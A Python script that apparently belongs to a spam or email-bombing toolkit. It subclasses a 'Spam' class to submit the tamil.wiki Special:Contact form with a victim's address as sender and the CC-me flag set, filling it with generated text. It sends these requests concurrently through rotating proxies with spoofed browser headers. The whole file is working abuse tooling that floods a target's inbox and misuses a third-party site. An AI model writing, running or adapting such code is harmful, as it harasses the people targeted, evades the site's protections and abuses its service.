from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        import requests

        cookies = {
            '_ga': 'GA1.1.121637728.1678093169',
            '_ga_T2JNP2LCT4': 'GS1.1.1678093168.1.1.1678093415.0.0.0',
        }

        headers = {
            'authority': 'tamil.wiki',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            # 'cookie': '_ga=GA1.1.121637728.1678093169; _ga_T2JNP2LCT4=GS1.1.1678093168.1.1.1678093415.0.0.0',
            'origin': 'https://tamil.wiki',
            'pragma': 'no-cache',
            'referer': 'https://tamil.wiki/wiki/Special:Contact',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        }

        data = {
            'wpFromName': self.get_text(),
            'wpFromAddress': target,
            'wpSubject': self.get_text(),
            'wpLink': 'test',
            'wpText': self.get_text(),
            'wpCCme': '1',
            'wpEditToken': '+\\',
            'title': 'Special:Contact',
            'wpFormType': '',
        }

        response = requests.post('https://tamil.wiki/wiki/Special:Contact', cookies=cookies, headers=headers, data=data,
                                 proxies=self.get_proxies(), timeout=20)
        return response


def main():
    s = 'Your email message has been sent.'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
